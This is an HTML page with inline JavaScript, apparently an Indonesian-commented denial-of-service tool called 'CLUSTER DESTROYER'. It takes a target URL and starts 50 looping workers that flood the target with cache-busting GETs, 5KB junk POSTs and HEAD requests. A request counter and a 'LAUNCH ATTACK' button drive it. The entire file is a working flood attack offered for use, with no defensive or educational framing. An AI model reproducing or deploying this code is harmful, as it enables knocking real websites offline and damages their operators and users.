<!DOCTYPE html>
<html lang="id">
<head>

    <style>
        body { background: #000; color: #ff0000; font-family: 'Arial Black', sans-serif; text-align: center; overflow: hidden; }
        .war-room { border: 5px solid #ff0000; margin: 20px auto; width: 90%; max-width: 600px; padding: 20px; background: #0a0000; box-shadow: 0 0 50px #ff0000; }
        input { width: 90%; padding: 15px; background: #1a1a1a; border: 2px solid #555; color: #0f0; font-weight: bold; margin-bottom: 10px; }
        .danger-zone { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0; }
        button { padding: 20px; font-size: 20px; cursor: pointer; border: none; font-weight: bold; text-transform: uppercase; }
        #start-btn { background: #ff0000; color: #fff; box-shadow: 0 0 20px #ff0000; }
        #stop-btn { background: #555; color: #fff; }
        .monitor { background: #111; border: 1px solid #333; height: 150px; overflow-y: hidden; font-family: monospace; font-size: 11px; color: #0f0; text-align: left; padding: 10px; margin-top: 15px; }
        .stats { font-size: 24px; color: yellow; margin: 10px 0; }
        .glitch-text { animation: shake 0.1s infinite; color: #ff0000; }
        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-2px, -1px); } 100% { transform: translate(1px, 1px); } }
    </style>
</head>
<body>

    <div class="war-room">
        <h1 class="glitch-text">ðŸ’€ CLUSTER DESTROYER ðŸ’€</h1>
        <input type="text" id="target" placeholder="https://target-victim.com">
        
        <div class="stats">Requests: <span id="count">0</span></div>

        <div class="danger-zone">
            <button id="start-btn" onclick="initiateMassiveAttack()">LAUNCH ATTACK</button>
            <button id="stop-btn" onclick="stopAttack()">CEASE FIRE</button>
        </div>

        <div style="color: #888; font-size: 12px;">Mode: <b>HYPER-MULTI-THREADED FLOOD</b></div>
        
        <div class="monitor" id="monitor">Waiting for target...</div>
    </div>

    <script>
        let running = false;
        let totalRequests = 0;
        let threads = [];

        function initiateMassiveAttack() {
            const target = document.getElementById('target').value;
            if (!target || !target.startsWith('http')) {
                alert("URL TARGET MANA WOI? (Pake http/https)");
                return;
            }

            running = true;
            document.getElementById('monitor').innerHTML = "!!! ATTACK INITIALIZED !!!";
            
            // Launch 50 "Threads" simulasi sekaligus
            for (let i = 0; i < 50; i++) {
                spawnWorker(target, i);
            }
        }

        async function spawnWorker(target, id) {
            while (running) {
                // Tembak pake 3 metode sekaligus dalam satu putaran
                const methods = [
                    // 1. GET Flood with Random Params (Cache Buster)
                    fetch(`${target}?busting=${Math.random()}`, { mode: 'no-cors', cache: 'no-store' }),
                    
                    // 2. POST Flood with Heavy Payload (Bandwidth Eater)
                    fetch(target, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({ junk: "x".repeat(5000) }), // Kirim sampah 5KB per request
                        headers: { 'Content-Type': 'application/json' }
                    }),

                    // 3. HEAD Request (Resource Exhaustion)
                    fetch(target, { method: 'HEAD', mode: 'no-cors' })
                ];

                try {
                    // Eksekusi semua secara paralel
                    await Promise.allSettled(methods);
                    totalRequests += 3;
                    updateStats();
                } catch (e) {
                    totalRequests += 3;
                    updateStats();
                }

                // Jeda super singkat biar browser gak bener-bener crash tapi tetep kenceng
                await new Promise(r => setTimeout(r, 1));
            }
        }

        function stopAttack() {
            running = false;
            document.getElementById('monitor').innerHTML += "<br>!!! ATTACK HALTED !!!";
        }

        function updateStats() {
            document.getElementById('count').innerText = totalRequests.toLocaleString();
            if (totalRequests % 100 === 0) {
                const mon = document.getElementById('monitor');
                mon.innerHTML = `[SYSTEM] Sending Burst Packets... Total: ${totalRequests}<br>` + mon.innerHTML;
                if (mon.innerHTML.length > 1000) mon.innerHTML = mon.innerHTML.substring(0, 1000);
            }
        }
    </script>
